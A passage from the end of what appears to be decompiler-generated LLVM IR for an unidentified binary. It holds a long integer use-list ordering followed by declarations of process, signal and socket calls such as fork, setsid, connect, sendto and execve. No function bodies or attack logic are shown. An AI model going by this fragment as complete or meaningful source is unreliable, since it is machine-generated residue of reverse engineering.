243, 807, 115, 116, 117, 118, 809, 808, 59, 58, 147, 1415, 1416, 1417, 1418, 1420, 1419, 28, 1512, 1513, 246, 245, 810, 119, 120, 121, 122, 812, 811, 61, 60, 46, 86, 1514, 813, 29, 1515, 1516, 123, 1517, 1518, 1519, 1520, 1521, 232, 814, 817, 815, 816, 1522, 818, 303, 404, 900, 405, 263, 406, 901, 403, 44, 45, 407, 902, 903, 408, 416, 417, 445, 446, 62, 316, 399, 400, 401, 317, 402, 904, 264, 148, 410, 411, 409, 905, 906, 907, 908, 910, 282, 909, 911, 912, 414, 415, 412, 413, 913, 233, 318, 265, 916, 418, 915, 420, 421, 419, 422, 423, 917, 918, 346, 919, 424, 920, 425, 63, 102, 149, 150, 151, 152, 153, 154, 155, 319, 426, 320, 234, 931, 932, 432, 235, 933, 936, 433, 934, 434, 236, 935, 267, 937, 435, 938, 429, 939, 942, 430, 940, 431, 941, 266, 943, 428, 436, 944, 945, 437, 946, 949, 438, 947, 439, 948, 268, 950, 427, 440, 951, 441, 952, 442, 953, 443, 954, 955, 956, 444, 957, 958, 959, 960, 156, 965, 304, 966, 449, 967, 64, 321, 968, 969, 970, 977, 448, 971, 972, 973, 974, 975, 976, 269, 978, 450, 979, 347, 980, 981, 447, 982, 983, 984, 985, 986, 157, 158, 159, 989, 452, 990, 285, 65, 283, 284, 991, 992, 993, 127, 348, 994, 453, 995, 451, 996, 997, 998, 454, 999, 288, 286, 66, 287, 1000, 1001, 455, 1002, 1003, 456, 1004, 1005, 1006, 237, 457, 1212, 1213, 67, 88, 322, 459, 460, 458, 461, 819, 820, 484, 821, 822, 823, 824, 483, 825, 826, 827, 828, 482, 829, 830, 831, 832, 479, 480, 462, 833, 481, 478, 270, 271, 834, 835, 470, 836, 471, 472, 473, 474, 475, 476, 477, 794, 1237, 68, 98, 1238, 323, 1239, 463, 464, 465, 466, 467, 468, 469, 69, 89, 97, 485, 486, 1240, 487, 1241, 324, 325, 326, 1406, 349, 1407, 1408, 1409, 99, 160, 161, 70, 71, 238, 239, 240, 241, 488, 327, 328, 329, 330, 495, 1423, 1425, 1426, 1427, 490, 1428, 491, 492, 493, 489, 272, 494, 1424, 350, 497, 498, 496, 331, 30, 500, 499, 501, 1430, 332, 333, 334, 335, 1433, 1434, 504, 502, 503, 273, 1435, 1436, 1437, 351, 289, 1441, 1442, 336, 1438, 1439, 505, 506, 507, 1440, 509, 510, 511, 512, 513, 508, 274, 514, 1443, 515, 72, 521, 73, 520, 516, 519, 276, 522, 517, 518, 275, 523, 74, 90, 1464, 1465, 352, 1466, 1467, 162, 1468, 75, 353, 1470, 277, 524, 525, 526, 527, 1472, 1473, 305, 1482, 1483, 528, 1484, 529, 1485, 1486, 530, 163, 531, 532, 533, 534, 535, 1533, 164, 76, 290, 278, 339, 340, 1523, 1524, 1525, 279, 337, 338, 341, 1526, 1527, 342, 1528, 1529, 281, 77, 165, 166, 280, 1531, 1532, 354, 167, 78, 536, 1530, 1534, 1535, 343, 1536, 839, 840, 537, 538, 539, 540, 541, 542, 543, 544, 545, 546, 547, 548, 549, 550, 551, 552, 553, 554, 555, 556, 557, 558, 559, 560, 561, 562, 563, 564, 565, 566, 567, 568, 569, 570, 571, 572, 573, 574, 575, 576, 577, 578, 579, 580, 581, 582, 583, 584, 585, 586, 587, 588, 589, 590, 591, 592, 593, 594, 595, 596, 597, 598, 599, 600, 601, 602, 603, 604, 605, 606, 607, 608, 609, 610, 611, 612, 613, 614, 615, 616, 617, 618, 619, 620, 621, 622, 623, 624, 625, 626, 627, 628, 629, 630, 631, 632, 633, 634, 635, 636, 637, 638, 639, 640, 641, 642, 643, 644, 645, 646, 647, 648, 649, 650, 651, 652, 653, 654, 655, 656, 657, 658, 659, 660, 661, 662, 663, 664, 665, 666, 667, 668, 669, 670, 671, 672, 673, 674, 675, 676, 677, 678, 679, 680, 681, 682, 683, 684, 685, 686, 687, 688, 689, 690, 691, 692, 693, 694, 695, 696, 697, 698, 699, 700, 701, 702, 703, 704, 705, 706, 707, 708, 709, 710, 711, 712, 713, 714, 715, 716, 717, 718, 719, 720, 721, 722, 723, 724, 725, 726, 727, 728, 729, 730, 731, 732, 733, 734, 735, 736, 737, 738, 739, 740, 741, 742, 743, 744, 745, 746, 747, 748, 749, 750, 751, 752, 753, 754, 755, 756, 757, 758, 759, 760, 761, 762, 763, 764, 765, 766, 767, 768, 769, 770, 771, 772, 773, 774, 775, 776, 777, 778, 779, 780, 781, 782, 783, 784, 785, 786, 787, 788, 789, 790, 791, 1656, 1657, 1658, 1659, 1660, 1661, 1662, 1663, 1664, 1665, 1666, 1667, 1668, 1669, 1670 }
  uselistorder i32* @r4, {}
}

declare i32 @vfork() local_unnamed_addr

declare i32 @fork() local_unnamed_addr

declare i32 @fcntl(i32, i32, ...) local_unnamed_addr

declare void @exit(i32) local_unnamed_addr

declare i32 @close(i32) local_unnamed_addr

declare i32 @getpid() local_unnamed_addr

declare i32 @open(i8*, i32, ...) local_unnamed_addr

declare i32 @pipe([2 x i32]) local_unnamed_addr

declare i32 @read(i32, i32*, i32) local_unnamed_addr

declare i32 @setsid() local_unnamed_addr

declare i32 @sigprocmask(i32, %_TYPEDEF_sigset_t*, %_TYPEDEF_sigset_t*) local_unnamed_addr

declare i32 @time(i32*) local_unnamed_addr

declare i32 @write(i32, i32*, i32) local_unnamed_addr

declare i32 @connect(i32, %sockaddr*, i32) local_unnamed_addr

declare i32 @getsockname(i32, %sockaddr*, i32*) local_unnamed_addr

declare i32 @recv(i32, i32*, i32, i32) local_unnamed_addr

declare i32 @send(i32, i32*, i32, i32) local_unnamed_addr

declare i32 @sendto(i32, i32*, i32, i32, %sockaddr*, i32) local_unnamed_addr

declare i32 @setsockopt(i32, i32, i32, i32*, i32) local_unnamed_addr

declare i32 @sigreturn(%sigcontext*) local_unnamed_addr

declare i32 @sigaction(i32, %sigaction*, %sigaction*) local_unnamed_addr

declare i32 @execve(i8*, [1 x i8*], [1 x i8*]) local_unnamed_addr

declare i32 @nanosleep(%timespec*, %timespec*) local_unnamed_addr

declare i32 @brk(i32*) local_unnamed_addr

declare i32 @poll(%pollfd*, i32, i32) local_unnamed_addr

declare i32 @__decompiler_undefined_function_0() local_unnamed_addr

declare i8* @__decompiler_undefined_function_1() local_unnamed_addr

declare i8 @__decompiler_undefined_function_2() local_unnamed_addr

declare i8** @__decompiler_undefined_function_3() local_unnamed_addr

; Function Attrs: nounwind readnone
declare i32 @llvm.bswap.i32(i32) #1

declare float @fabsf(float)

attributes #0 = { noreturn }
attributes #1 = { nounwind readnone }
